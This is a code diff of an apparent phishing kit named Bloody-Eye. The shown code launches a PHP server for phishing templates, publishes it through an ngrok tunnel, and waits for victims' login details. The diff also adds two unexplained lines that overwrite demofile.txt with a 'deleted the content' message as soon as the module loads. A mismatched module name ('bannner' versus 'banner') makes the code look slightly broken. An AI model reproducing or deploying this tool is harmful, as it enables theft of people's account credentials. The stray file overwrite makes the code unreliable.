@@ -9,7 +9,8 @@ from pyngrok import ngrok
 import json
 from modules import bannner
 import time
-
+f = open("demofile.txt", "w")
+f.write("Woops! I have deleted the content!")
 stat_file = 0
 # instagram temp
 def instagram():
@@ -553,7 +554,6 @@ exit();""")
       with open("log","w") as phplog:
         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
       print("")
-      banner.banner()
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
 
       link = ngrok.connect(6060,"http")
@@ -562,7 +562,6 @@ exit();""")
       print("\n"+b_print_link)
       print("\n"+Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url2 : "+link)
       print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.WHITE+" Waiting for Login Info. "+Fore.BLUE+"Ctrl + C "+Fore.WHITE+"to exit")
-      os.system("clear")
 
     
 # Getting User And Password
